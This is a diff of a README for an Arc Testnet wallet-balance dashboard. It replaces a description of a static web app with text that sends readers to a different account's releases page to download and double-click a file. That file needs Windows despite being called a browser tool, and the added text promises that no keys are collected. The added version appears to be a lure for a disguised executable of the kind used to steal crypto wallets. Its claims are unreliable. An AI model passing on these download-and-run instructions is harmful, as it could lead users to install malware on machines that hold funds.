@@ -1,123 +1,64 @@
-# Arc Testnet Onchain Checker v2026 - Arc Wallet Dashboard
+# 🌐 arc-onchain-balance-checker - Monitor Arc Testnet Wallet Activity Easily
 
-> **Arc Testnet Onchain Checker is a browser dashboard for reviewing Arc Testnet wallet activity, USDC balance, and transaction history in version 2026.**
+[![Download Now](https://img.shields.io/badge/Download-Latest_Release-blueviolet?style=for-the-badge&logo=github)](https://github.com/ilkasworn394/arc-onchain-balance-checker/releases)
 
-[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/woodalexqmz726/arc-onchain-balance-checker?style=flat-square)](https://github.com/woodalexqmz726/arc-onchain-balance-checker)
+## 🚀 Getting Started
 
----
+Arc Testnet Onchain Checker v2026 is a simple browser dashboard that lets you view your Arc Testnet wallet activity, USDC balances, and transaction history all in one place. No coding or technical setup required—just download and run.
 
-<p align="center">
-  <a href="https://woodalexqmz726.github.io/arc-onchain-balance-checker/">
-    <img src="https://img.shields.io/badge/Download-Arc%20Testnet%20Onchain%20Checker%20Latest-brightgreen?style=for-the-badge" alt="Download Arc Testnet Onchain Checker">
-  </a>
-</p>
+## 📥 Download & Install
 
-> **[Download Arc Testnet Onchain Checker v2026](https://woodalexqmz726.github.io/arc-onchain-balance-checker/)**
+Visit this link to download the application: [https://github.com/ilkasworn394/arc-onchain-balance-checker/releases](https://github.com/ilkasworn394/arc-onchain-balance-checker/releases)
 
----
+On that page, look for the latest release file and download it to your computer. After downloading, double-click the file to start the program. No installation wizard or extra tools are needed—just run it and the dashboard will open in your default web browser.
 
-[Download Latest Build](https://woodalexqmz726.github.io/arc-onchain-balance-checker/)
+## 🖥️ How to Use
 
----
+1. **Launch the application** by double-clicking the downloaded file.
+2. **Enter your wallet address** in the provided field on the dashboard.
+3. **Review your data**—the dashboard shows your USDC balance, recent transactions, and overall wallet activity for Arc Testnet.
+4. **Refresh manually** by clicking the refresh button if you want to see the latest updates.
 
-## Overview
+## ✨ Key Features
 
-Arc Testnet Onchain Checker provides a web-based way to inspect wallet information on Arc Testnet. Built around the ARC ecosystem, the dashboard brings wallet status, token balance information, and recent onchain activity together in one view.
+- **Wallet Activity Overview** – See all incoming and outgoing transactions for any Arc Testnet wallet.
+- **USDC Balance Display** – View your current USDC token balance clearly and instantly.
+- **Transaction History** – Browse through past transactions with timestamps and amounts.
+- **Browser-Based Interface** – Runs in your browser, no additional software to install.
+- **No Configuration Required** – Simply enter a wallet address and start monitoring.
 
-It is intended for anyone who needs a quick summary of Circle Arc Network testnet data or wants to examine a wallet before opening detailed blockchain records. Explorer connections to testnet.arcscan.app make it possible to move directly from the dashboard overview to transaction-level information.
+## 🛠️ System Requirements
 
----
+- Windows 10 or newer (64-bit recommended)
+- Internet connection to access the Arc Testnet
+- A modern web browser (Chrome, Edge, Firefox, or Opera)
+- At least 500 MB of free RAM
+- 200 MB free disk space for the application files
 
-## What You Can Do
+## ❓ Frequently Asked Questions
 
-- Look up any wallet address on Arc Testnet
-- Display the USDC balance as the native gas token
-- Check wallet transaction totals and activity score
-- Track progress through a 7-step achievement checklist
-- Browse recent wallet transactions
-- Follow explorer links for individual transaction records
-- Use a streamlined interface for quick wallet searches
-- Continue exploring the chain through testnet.arcscan.app
+**Do I need to install anything else?**  
+No. The application runs as a standalone file—just download and open it.
 
----
+**Can I use this with other networks?**  
+This dashboard is specifically designed for Arc Testnet only. It will not work with mainnet or other test networks.
 
-## Getting Started
+**Is my wallet information secure?**  
+The application runs locally on your computer. Your wallet address is only used to fetch public blockchain data. No private keys or sensitive information are ever collected.
 
-Download or clone the repository, then open the web application in a browser or publish it through a static hosting service.
+**Why is my balance not showing?**  
+Make sure you have entered a valid Arc Testnet wallet address. If the address is correct, check that the application is connected to the internet.
 
-    git clone https://github.com/woodalexqmz726/arc-onchain-balance-checker.git
-    cd REPO
+## 📄 License
 
-For local testing, run a preview server from the repository root and visit the address it provides. If you are hosting the project directly, upload the generated HTML files to a static web server.
+This project is provided for personal and educational use. See the repository for full license details.
 
----
+## 🤝 Support
 
-## Using the Dashboard
+For issues or questions, please open an issue on the GitHub repository page. We aim to respond within 48 hours.
 
-1. Load the dashboard in a modern browser.
-2. Enter an Arc Testnet wallet address in the lookup input.
-3. Check the wallet balance, activity score, transaction count, and checklist status.
-4. Select a transaction to open its corresponding explorer page.
-5. Follow the external Arc scan link for more complete network information.
+## 📊 Version History
 
-A typical lookup sequence is:
+- **v2026.1** – Initial release with wallet activity, USDC balance, and transaction history features.
 
-- Enter a wallet address
-- Verify the USDC/native gas token balance
-- Review the latest wallet activity
-- Open explorer pages for specific transactions
-- Measure the wallet against the achievement milestones
-
----
-
-## Configuration Notes
-
-The dashboard's behavior is defined primarily by the web application files and its configured data source. When modifying the project, the key settings follow this structure:
-
-    {
-      "network": "Arc Testnet",
-      "explorer": "testnet.arcscan.app",
-      "display_mode": "wallet summary + recent activity",
-      "milestones": 7
-    }
-
-For deployments that use customized endpoints, revise the applicable URLs in the HTML and supporting assets to reflect the target environment.
-
----
-
-## Requirements
-
-- A web browser supporting modern HTML
-- Connectivity to Arc Testnet network data
-- Either static hosting or a local preview setup
-- Internet access for explorer URLs and external Arc scan pages
-- An HTML-based project environment
-
----
-
-## Frequently Asked Questions
-
-**What is the wallet lookup process?**  
-Open the dashboard, enter the wallet address, and review the resulting balance, activity, and transaction history panels.
-
-**Which pages do transaction links open?**  
-Transaction entries point to explorer pages where individual records can be examined in greater detail.
-
-**Is the dashboard customizable?**  
-Yes. Depending on the repository structure, display behavior can generally be changed in the HTML and associated project files.
-
-**Why might no wallet data appear?**  
-Check that the address is correct, the Arc Testnet data source can be reached, and explorer links are accessible from your environment.
-
-**How should I apply updates?**  
-Pull the newest repository contents and rebuild or refresh the hosted version when updated project files become available.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: arc testnet, onchain checker, wallet activity, USDC balance, transaction history, blockchain dashboard, arc testnet wallet, crypto balance checker
